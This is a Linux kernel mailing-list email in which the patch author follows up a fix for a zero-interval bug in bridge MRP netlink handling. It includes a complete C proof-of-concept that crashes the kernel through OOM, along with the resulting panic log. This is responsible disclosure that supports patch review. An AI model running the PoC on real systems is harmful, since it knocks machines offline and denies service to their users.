Received: from mail-dy1-f180.google.com (mail-dy1-f180.google.com [74.125.82.180])
	(using TLSv1.2 with cipher ECDHE-RSA-AES128-GCM-SHA256 (128/128 bits))
	(No client certificate requested)
	by smtp.subspace.kernel.org (Postfix) with ESMTPS id 2DE6986341
	for <bridge@lists.linux.dev>; Thu, 26 Mar 2026 03:42:08 +0000 (UTC)
Authentication-Results: smtp.subspace.kernel.org; arc=none smtp.client-ip=74.125.82.180
ARC-Seal:i=1; a=rsa-sha256; d=subspace.kernel.org; s=arc-20240116;
	t=1774496530; cv=none; b=Ju0Uu3m5JIwV9tQaSE9REYAeQ9QPsMBpTnNwimFwiF1mR7ForJmsZ7BKszFCWKVnqw5Y1YJdKTV/B2yTd0ffIi8whQlvWtNf+ntZ/xhv/Yb/6wemlETG4nIy1rW1tPsE65637Elyr140CpdtWLEHC3Ht1maJuNmh3PCxQ+ScC4I=
ARC-Message-Signature:i=1; a=rsa-sha256; d=subspace.kernel.org;
	s=arc-20240116; t=1774496530; c=relaxed/simple;
	bh=cweZaKc66bfM/LLA+0ugstFKpSKueIJw4TGmMvlTaKI=;
	h=Date:From:To:Cc:Subject:Message-ID:References:MIME-Version:
	 Content-Type:Content-Disposition:In-Reply-To; b=TXd5kGYBinwPo7kvNu21xzur2RP7lhridj6MZmyYiro8b7UcWAWRyJ/l7KJRZI+eAA3TUQ78FNeQDr0Swb60W740MpBCUUI5Ok97nSU48YgvsvXu5/ZPcIin5shQLoxguKub3PF3Jv7Jq8BYQQWHKI8V/0HoURT2eJMwYKp4lAo=
ARC-Authentication-Results:i=1; smtp.subspace.kernel.org; dmarc=pass (p=none dis=none) header.from=asu.edu; spf=pass smtp.mailfrom=asu.edu; dkim=pass (2048-bit key) header.d=asu.edu header.i=@asu.edu header.b=eZWxkxP5; arc=none smtp.client-ip=74.125.82.180
Authentication-Results: smtp.subspace.kernel.org; dmarc=pass (p=none dis=none) header.from=asu.edu
Authentication-Results: smtp.subspace.kernel.org; spf=pass smtp.mailfrom=asu.edu
Authentication-Results: smtp.subspace.kernel.org;
	dkim=pass (2048-bit key) header.d=asu.edu header.i=@asu.edu header.b="eZWxkxP5"
Received: by mail-dy1-f180.google.com with SMTP id 5a478bee46e88-2c160cb021cso586274eec.1
        for <bridge@lists.linux.dev>; Wed, 25 Mar 2026 20:42:08 -0700 (PDT)
DKIM-Signature: v=1; a=rsa-sha256; c=relaxed/relaxed;
        d=asu.edu; s=google; t=1774496528; x=1775101328; darn=lists.linux.dev;
        h=in-reply-to:content-transfer-encoding:content-disposition
         :mime-version:references:message-id:subject:cc:to:from:date:from:to
         :cc:subject:date:message-id:reply-to;
        bh=hxEJSX+N7SRM79GBHFRd7FSM56bucRLuiNgC4aXl5i0=;
        b=eZWxkxP5ZBbNnSer/AEf726gMjjjp3eBzDhyK9ygiwvLcV9IIPHbdY06sz9CZHeng0
         dhK+SCvjYpgArLXAiNjKUH9aPkSV61Hxh/NgSu9bPNONugO9QORLT/pmIT80x8R3u76F
         L3cj2JVU2h1QjBmK1SLp7DwOTawUIplsg80YnMWMKLa/1mI5Jz6CPi9NQj1j9eAVkpO0
         tXdZNh/zIeSYb8R7tLWdfS9qyVo1/lT4knjFur10MXsRyLheLq1PcoQKAGZhdpE2oCVR
         kn1hk4BXHIkXoG417krsa7tCY85Ero2G1/NFbhUTT9k0UuT78optGowy8mykABfudQru
         NyLA==
X-Google-DKIM-Signature: v=1; a=rsa-sha256; c=relaxed/relaxed;
        d=1e100.net; s=20251104; t=1774496528; x=1775101328;
        h=in-reply-to:content-transfer-encoding:content-disposition
         :mime-version:references:message-id:subject:cc:to:from:date:x-gm-gg
         :x-gm-message-state:from:to:cc:subject:date:message-id:reply-to;
        bh=hxEJSX+N7SRM79GBHFRd7FSM56bucRLuiNgC4aXl5i0=;
        b=L+UVPJo6pzDCxBPyneNPbLOsqudMpk+dZMnkyrxRR3NfTQXKLQpN+OslEF9G1c7wG9
         428gbRZsjwlQ2SMyJmFGV0dCmdT8H7k37szpL9BEqabh7N+q+F9cf/5nSky3VIYZXgBY
         FyFdl7GFexwmkUSNzoNDBs3+XWUnTiitkhhbyt0QKD+OkgQLvMXdgpzsjq2vA1eXA5ac
         i2shBmGlNf7kl7Ea9QEnBlJ5S5R6w5oKg9r3DBCTN0Bys9mrKSfQMiTTDF6ZVVHDvYTg
         VXntNqa+2KDJFx7InaGG/Ui00hSR1QAC71ug4KOAnOArUNu49W1/bxpy6/cGWzHd9S+l
         VFFg==
X-Gm-Message-State: AOJu0YyjrK0yRLieF6BeRh8IMXqkgXwfEu7Wxowy5bkZquC5KWfrD0c0
	VaaJSNI8BhWi38ieV8N4zljo2UmOxQgGmSN27LKjhwULr7hI+64LAe8GTD9xv0afzw==
X-Gm-Gg: ATEYQzzyw4jdTV5xRS00U/x06oj2TVT7nA51Un0bTiNeL0vOqc5IoEqCcXjmlKJgN+l
	tXx2VkxYV3BnJOyxdE2D361tLRu/yQ/Ngq6aZqgWYbEVdo4GhOFdrHyXia/nIQR8Fh9FQv6pTSA
	2elEJaIc27NGGRc1JmKz6+9Fpcnx2mxbbNaILOAIyrrdW+DazbtpEjUKvMpgmfoZv9MRUifSUG6
	itjLhiyq2Hjyoe3wKiiJ3nZQGVpf6XKQWf1QL+/qbjEX62/5v8+e5u1IdQUahJIMZudNJVQkmx0
	fLrfHvTBA9nA/Lm1G343DezZN/g5dZcL5hf2D5n1s5NGftiQIh1mou9HVnWydfQESfXJNB9BwNt
	Uo92HhFaAMlIpbNV1/nWe4J5ulEsHD7Z+Y28p/xgvCTLq3qc4ginPSKFYN/YAhXon2L8DepLwnZ
	kx4sUyvHXG2PoM+/Pk0BiiW+pY6H8Rqw==
X-Received: by 2002:a05:7300:bc8a:b0:2c1:558c:16e1 with SMTP id 5a478bee46e88-2c15d32afb0mr3096520eec.4.1774496528054;
        Wed, 25 Mar 2026 20:42:08 -0700 (PDT)
Received: from p1 (209-147-138-15.nat.asu.edu. [209.147.138.15])
        by smtp.gmail.com with ESMTPSA id 5a478bee46e88-2c16ed9f739sm1495565eec.16.2026.03.25.20.42.07
        (version=TLS1_3 cipher=TLS_AES_256_GCM_SHA384 bits=256/256);
        Wed, 25 Mar 2026 20:42:07 -0700 (PDT)
Date: Wed, 25 Mar 2026 20:42:06 -0700
From: Xiang Mei <xmei5@asu.edu>
To: netdev@vger.kernel.org
Cc: bridge@lists.linux.dev, razor@blackwall.org, idosch@nvidia.com, 
	davem@davemloft.net, edumazet@google.com, pabeni@redhat.com, horms@kernel.org, 
	bestswngs@gmail.com
Subject: Re: [PATCH net] bridge: mrp: reject zero test interval to avoid OOM
 panic
Message-ID: <c6hlzeuqi3fj26s3tu7jojlyzjfxqbw2e5tx5n2z65s52nm5u3@uwgjnvfmcmft>
References: <20260326032438.3307549-1-xmei5@asu.edu>
Precedence: bulk
X-Mailing-List: bridge@lists.linux.dev
List-Id: <bridge.lists.linux.dev>
List-Subscribe: <mailto:bridge+subscribe@lists.linux.dev>
List-Unsubscribe: <mailto:bridge+unsubscribe@lists.linux.dev>
MIME-Version: 1.0
Content-Type: text/plain; charset=utf-8
Content-Disposition: inline
Content-Transfer-Encoding: 8bit
In-Reply-To: <20260326032438.3307549-1-xmei5@asu.edu>

On Wed, Mar 25, 2026 at 08:24:38PM -0700, Xiang Mei wrote:
> br_mrp_start_test() and br_mrp_start_in_test() accept the user-supplied
> interval value from netlink without validation. When interval is 0,
> usecs_to_jiffies(0) yields 0, causing the delayed work
> (br_mrp_test_work_expired / br_mrp_in_test_work_expired) to reschedule
> itself with zero delay. This creates a tight loop on system_percpu_wq
> that allocates and transmits MRP test frames at maximum rate, exhausting
> all system memory and causing a kernel panic via OOM deadlock.
> 
> The same zero-interval issue applies to br_mrp_start_in_test_parse()
> for interconnect test frames.
> 
> Use NLA_POLICY_MIN(NLA_U32, 1) in the nla_policy tables for both
> IFLA_BRIDGE_MRP_START_TEST_INTERVAL and
> IFLA_BRIDGE_MRP_START_IN_TEST_INTERVAL, so zero is rejected at the
> netlink attribute parsing layer before the value ever reaches the
> workqueue scheduling code. This is consistent with how other bridge
> subsystems (br_fdb, br_mst) enforce range constraints on netlink
> attributes.
> 
> Fixes: 7ab1748e4ce6 ("bridge: mrp: Extend MRP netlink interface for configuring MRP interconnect")
> Reported-by: Weiming Shi <bestswngs@gmail.com>
> Signed-off-by: Xiang Mei <xmei5@asu.edu>
> ---
>  net/bridge/br_mrp_netlink.c | 4 ++--
>  1 file changed, 2 insertions(+), 2 deletions(-)
> 
> diff --git a/net/bridge/br_mrp_netlink.c b/net/bridge/br_mrp_netlink.c
> index ce6f63c77cc0..86f0e75d6e34 100644
> --- a/net/bridge/br_mrp_netlink.c
> +++ b/net/bridge/br_mrp_netlink.c
> @@ -196,7 +196,7 @@ static const struct nla_policy
>  br_mrp_start_test_policy[IFLA_BRIDGE_MRP_START_TEST_MAX + 1] = {
>  	[IFLA_BRIDGE_MRP_START_TEST_UNSPEC]	= { .type = NLA_REJECT },
>  	[IFLA_BRIDGE_MRP_START_TEST_RING_ID]	= { .type = NLA_U32 },
> -	[IFLA_BRIDGE_MRP_START_TEST_INTERVAL]	= { .type = NLA_U32 },
> +	[IFLA_BRIDGE_MRP_START_TEST_INTERVAL]	= NLA_POLICY_MIN(NLA_U32, 1),
>  	[IFLA_BRIDGE_MRP_START_TEST_MAX_MISS]	= { .type = NLA_U32 },
>  	[IFLA_BRIDGE_MRP_START_TEST_PERIOD]	= { .type = NLA_U32 },
>  	[IFLA_BRIDGE_MRP_START_TEST_MONITOR]	= { .type = NLA_U32 },
> @@ -316,7 +316,7 @@ static const struct nla_policy
>  br_mrp_start_in_test_policy[IFLA_BRIDGE_MRP_START_IN_TEST_MAX + 1] = {
>  	[IFLA_BRIDGE_MRP_START_IN_TEST_UNSPEC]	= { .type = NLA_REJECT },
>  	[IFLA_BRIDGE_MRP_START_IN_TEST_IN_ID]	= { .type = NLA_U32 },
> -	[IFLA_BRIDGE_MRP_START_IN_TEST_INTERVAL]	= { .type = NLA_U32 },
> +	[IFLA_BRIDGE_MRP_START_IN_TEST_INTERVAL]	= NLA_POLICY_MIN(NLA_U32, 1),
>  	[IFLA_BRIDGE_MRP_START_IN_TEST_MAX_MISS]	= { .type = NLA_U32 },
>  	[IFLA_BRIDGE_MRP_START_IN_TEST_PERIOD]	= { .type = NLA_U32 },
>  };
> -- 
> 2.43.0
>

Thanks for your attention for this bug. Considering the low severity (DoS
only), we resend this bug to the open list.

The following information could help you to reproduce the bug:

Configs:
```
CONFIG_BRIDGE=y
CONFIG_BRIDGE_MRP=y
```

PoC Source Code:
```c
/*
 * PoC: MRP zero-interval workqueue DoS (OOM panic)
 * Requires: ns_capable(CAP_NET_ADMIN), CONFIG_BRIDGE=y, CONFIG_BRIDGE_MRP=y
 */
#define _GNU_SOURCE
#include <stdio.h>
#include <string.h>
#include <unistd.h>
#include <sys/socket.h>
#include <linux/netlink.h>
#include <linux/rtnetlink.h>
#include <linux/if_link.h>
#include <linux/if_bridge.h>
#include <net/if.h>
#include <sys/ioctl.h>

#define NLA4(l) (((l)+3)&~3)
#define NLAH    ((int)NLA4(sizeof(struct nlattr)))
#define VETH_INFO_PEER 1

static char buf[8192];
static int pos, nl_fd;
static unsigned seq = 1;

static void begin(int type, int flags) {
    memset(buf, 0, sizeof(buf));
    struct nlmsghdr *h = (void *)buf;
    h->nlmsg_type = type;
    h->nlmsg_flags = NLM_F_REQUEST | NLM_F_ACK | flags;
    h->nlmsg_seq = seq++;
    pos = NLMSG_HDRLEN;
}

static void ifinfo(int fam, int idx, unsigned fl, unsigned ch) {
    struct ifinfomsg *m = (void *)(buf + pos);
    m->ifi_family = fam; m->ifi_index = idx;
    m->ifi_flags = fl; m->ifi_change = ch;
    pos += NLMSG_ALIGN(sizeof(*m));
    ((struct nlmsghdr *)buf)->nlmsg_len = pos;
}

static struct nlattr *nest(int type) {
    struct nlattr *a = (void *)(buf + pos);
    a->nla_type = type | NLA_F_NESTED;
    a->nla_len = NLAH; pos += NLAH;
    return a;
}

static void nest_end(struct nlattr *a) {
    a->nla_len = buf + pos - (char *)a;
    ((struct nlmsghdr *)buf)->nlmsg_len = pos;
}

static void nla_put(int type, const void *data, int len) {
    struct nlattr *a = (void *)(buf + pos);
    a->nla_type = type; a->nla_len = NLAH + len;
    memcpy(buf + pos + NLAH, data, len);
    pos += NLA4(NLAH + len);
    ((struct nlmsghdr *)buf)->nlmsg_len = pos;
}

static void nla_str(int type, const char *s) { nla_put(type, s, strlen(s)+1); }
static void nla_u32(int type, __u32 v) { nla_put(type, &v, 4); }
static void nla_u16(int type, __u16 v) { nla_put(type, &v, 2); }

static int talk(void) {
    struct nlmsghdr *h = (void *)buf;
    struct sockaddr_nl sa = { .nl_family = AF_NETLINK };
    sendto(nl_fd, buf, h->nlmsg_len, 0, (void *)&sa, sizeof(sa));
    char rb[4096];
    while (1) {
        int n = recv(nl_fd, rb, sizeof(rb), 0);
        if (n < 0) return -1;
        for (struct nlmsghdr *r = (void *)rb; NLMSG_OK(r, n); r = NLMSG_NEXT(r, n)) {
            if (r->nlmsg_seq != h->nlmsg_seq) continue;
            if (r->nlmsg_type == NLMSG_ERROR)
                return ((struct nlmsgerr *)NLMSG_DATA(r))->error;
            if (r->nlmsg_type == NLMSG_DONE) return 0;
        }
    }
}

static int getidx(const char *name) {
    struct ifreq ifr = {};
    int fd = socket(AF_INET, SOCK_DGRAM, 0);
    strncpy(ifr.ifr_name, name, IFNAMSIZ - 1);
    ioctl(fd, SIOCGIFINDEX, &ifr);
    close(fd);
    return ifr.ifr_ifindex;
}

static void mk_veth(const char *a, const char *b) {
    begin(RTM_NEWLINK, NLM_F_CREATE | NLM_F_EXCL);
    ifinfo(AF_UNSPEC, 0, 0, 0);
    nla_str(IFLA_IFNAME, a);
    struct nlattr *li = nest(IFLA_LINKINFO);
    nla_str(IFLA_INFO_KIND, "veth");
    struct nlattr *d = nest(IFLA_INFO_DATA);
    struct nlattr *p = nest(VETH_INFO_PEER);
    memset(buf + pos, 0, sizeof(struct ifinfomsg));
    pos += NLMSG_ALIGN(sizeof(struct ifinfomsg));
    ((struct nlmsghdr *)buf)->nlmsg_len = pos;
    nla_str(IFLA_IFNAME, b);
    nest_end(p); nest_end(d); nest_end(li);
    talk();
}

static void link_up(int idx) {
    begin(RTM_NEWLINK, 0); ifinfo(AF_UNSPEC, idx, IFF_UP, IFF_UP); talk();
}

static void set_master(int idx, int master) {
    begin(RTM_NEWLINK, 0); ifinfo(AF_UNSPEC, idx, 0, 0);
    nla_u32(IFLA_MASTER, master); talk();
}

static int mrp(int idx, void (*build)(int, int), int p, int s) {
    begin(RTM_SETLINK, 0);
    ifinfo(AF_BRIDGE, idx, 0, 0);
    struct nlattr *af = nest(IFLA_AF_SPEC);
    struct nlattr *m = nest(IFLA_BRIDGE_MRP);
    build(p, s);
    nest_end(m); nest_end(af);
    return talk();
}

static void build_inst(int p, int s) {
    struct nlattr *n = nest(IFLA_BRIDGE_MRP_INSTANCE);
    nla_u32(IFLA_BRIDGE_MRP_INSTANCE_RING_ID, 1);
    nla_u32(IFLA_BRIDGE_MRP_INSTANCE_P_IFINDEX, p);
    nla_u32(IFLA_BRIDGE_MRP_INSTANCE_S_IFINDEX, s);
    nla_u16(IFLA_BRIDGE_MRP_INSTANCE_PRIO, 0x8000);
    nest_end(n);
}

static void build_role(int p, int s) {
    (void)p; (void)s;
    struct nlattr *n = nest(IFLA_BRIDGE_MRP_RING_ROLE);
    nla_u32(IFLA_BRIDGE_MRP_RING_ROLE_RING_ID, 1);
    nla_u32(IFLA_BRIDGE_MRP_RING_ROLE_ROLE, 2);
    nest_end(n);
}

static void build_test(int p, int s) {
    (void)p; (void)s;
    struct nlattr *n = nest(IFLA_BRIDGE_MRP_START_TEST);
    nla_u32(IFLA_BRIDGE_MRP_START_TEST_RING_ID, 1);
    nla_u32(IFLA_BRIDGE_MRP_START_TEST_INTERVAL, 0);      /* BUG */
    nla_u32(IFLA_BRIDGE_MRP_START_TEST_MAX_MISS, 3);
    nla_u32(IFLA_BRIDGE_MRP_START_TEST_PERIOD, 60000000);
    nla_u32(IFLA_BRIDGE_MRP_START_TEST_MONITOR, 0);
    nest_end(n);
}

int main(void) {
    printf("[*] MRP zero-interval DoS PoC\n");

    nl_fd = socket(AF_NETLINK, SOCK_RAW, NETLINK_ROUTE);
    struct sockaddr_nl sa = { .nl_family = AF_NETLINK };
    bind(nl_fd, (void *)&sa, sizeof(sa));

    /* bridge + 2 veth pairs */
    begin(RTM_NEWLINK, NLM_F_CREATE | NLM_F_EXCL);
    ifinfo(AF_UNSPEC, 0, 0, 0);
    nla_str(IFLA_IFNAME, "br0");
    struct nlattr *li = nest(IFLA_LINKINFO);
    nla_str(IFLA_INFO_KIND, "bridge"); nest_end(li);
    talk();

    mk_veth("mp0", "mp0p");
    mk_veth("ms0", "ms0p");

    int br = getidx("br0"), pi = getidx("mp0"), si = getidx("ms0");
    set_master(pi, br); set_master(si, br);
    link_up(br); link_up(pi); link_up(si);
    link_up(getidx("mp0p")); link_up(getidx("ms0p"));

    /* MRP: instance → role → test(interval=0) */
    if (mrp(pi, build_inst, pi, si) < 0) return 1;
    mrp(pi, build_role, pi, si);
    mrp(pi, build_test, pi, si);

    printf("[+] Waiting for OOM panic...\n");
    sleep(120);
    return 0;
}
```

The intended crash:
```
[   10.874074] Out of memory: Killed process 143 (exploit) total-vm:1032kB, anon-rss:64kB, file-rss:4kB, shmem-rss:684kB, UID:0 pgtables:40kB oom_score_adj:0
[   10.876511] Out of memory: Killed process 142 (su) total-vm:4528kB, anon-rss:388kB, file-rss:4kB, shmem-rss:0kB, UID:0 pgtables:52kB oom_score_adj:0
[   10.879768] Out of memory: Killed process 140 (su) total-vm:4508kB, anon-rss:376kB, file-rss:4kB, shmem-rss:0kB, UID:0 pgtables:52kB oom_score_adj:0
[   10.880885] Out of memory: Killed process 129 (init.sh) total-vm:3992kB, anon-rss:264kB, file-rss:4kB, shmem-rss:0kB, UID:0 pgtables:44kB oom_score_adj:0
[   10.883589] Out of memory: Killed process 141 (bash) total-vm:3912kB, anon-rss:248kB, file-rss:4kB, shmem-rss:0kB, UID:0 pgtables:48kB oom_score_adj:0
[   10.886036] Kernel panic - not syncing: System is deadlocked on memory
[   10.886394] CPU: 0 UID: 0 PID: 1 Comm: init Not tainted 7.0.0-rc4+ #6 PREEMPTLAZY
[   10.886803] Hardware name: QEMU Standard PC (i440FX + PIIX, 1996), BIOS rel-1.17.0-0-gb52ca86e094d-prebuilt.qemu.org 04/01/2014
[   10.887379] Call Trace:
[   10.887518]  <TASK>
[   10.887626]  vpanic+0x694/0x780
[   10.887785]  ? __pfx_vpanic+0x10/0x10
[   10.887965]  ? __pfx__raw_spin_lock+0x10/0x10
[   10.888199]  panic+0xca/0xd0
[   10.888349]  ? __pfx_panic+0x10/0x10
[   10.888531]  ? panic_on_this_cpu+0x1a/0x40
[   10.888738]  out_of_memory+0x124e/0x1350
[   10.888921]  ? __pfx_out_of_memory+0x10/0x10
[   10.889132]  __alloc_pages_slowpath.constprop.0+0x2325/0x2dd0
[   10.889426]  ? __pfx_do_wp_page+0x10/0x10
[   10.889618]  ? __pfx___alloc_pages_slowpath.constprop.0+0x10/0x10
[   10.889911]  ? __alloc_frozen_pages_noprof+0x4f8/0x800
[   10.890178]  __alloc_frozen_pages_noprof+0x4f8/0x800
[   10.890417]  ? __pfx___alloc_frozen_pages_noprof+0x10/0x10
[   10.890678]  ? alloc_pages_mpol+0x13a/0x390
[   10.890883]  ? __pfx_alloc_pages_mpol+0x10/0x10
[   10.891106]  alloc_pages_mpol+0x13a/0x390
[   10.891313]  ? __pfx_alloc_pages_mpol+0x10/0x10
[   10.891535]  ? xas_load+0x18/0x270
[   10.891704]  folio_alloc_noprof+0x16/0xd0
[   10.891903]  filemap_alloc_folio_noprof.part.0+0x1f7/0x350
[   10.892188]  ? __pfx_filemap_alloc_folio_noprof.part.0+0x10/0x10
[   10.892485]  ? page_cache_ra_unbounded+0x351/0x7b0
[   10.892740]  __filemap_get_folio_mpol+0x278/0x4f0
[   10.892969]  filemap_fault+0x10eb/0x2fc0
[   10.893177]  ? __pfx_filemap_fault+0x10/0x10
[   10.893384]  ? recalc_sigpending+0x19b/0x230
[   10.893588]  __do_fault+0xf4/0x6d0
[   10.893751]  do_fault+0x891/0x11f0
[   10.893919]  __handle_mm_fault+0x918/0x1400
[   10.894126]  ? __pfx___handle_mm_fault+0x10/0x10
[   10.894369]  ? __pfx_vma_start_read+0x10/0x10
[   10.894585]  ? __pfx_lock_vma_under_rcu+0x10/0x10
[   10.894809]  handle_mm_fault+0x464/0xc70
[   10.894999]  do_user_addr_fault+0x27b/0xbb0
[   10.895209]  exc_page_fault+0x6b/0xe0
[   10.895385]  asm_exc_page_fault+0x26/0x30
[   10.895569] RIP: 0033:0x572bb2c72c30
[   10.895733] Code: Unable to access opcode bytes at 0x572bb2c72c06.
[   10.896007] RSP: 002b:00007ffdf17d8538 EFLAGS: 00010246
[   10.896255] RAX: 0000000000000000 RBX: 0000572bb2c81b28 RCX: 00007ff928e02dba
[   10.896590] RDX: 00007ffdf17d8540 RSI: 00007ffdf17d8670 RDI: 0000000000000011
[   10.896915] RBP: 00007ffdf17d9270 R08: 0000000000000000 R09: 00007ff928f10580
[   10.897242] R10: 0000000000000000 R11: 0000000000000246 R12: 0000572bb2c81b90
[   10.897556] R13: 0000000000000001 R14: 0000000000000000 R15: 00007ffdf17d926c
[   10.897872]  </TASK>
[   10.898040] Kernel Offset: disabled
```

This bug is a DoS bug requiring ns_capable(CAP_NET_ADMIN).
Please let me know if you have any questions for the patch and poc.

Thanks,
Xiang
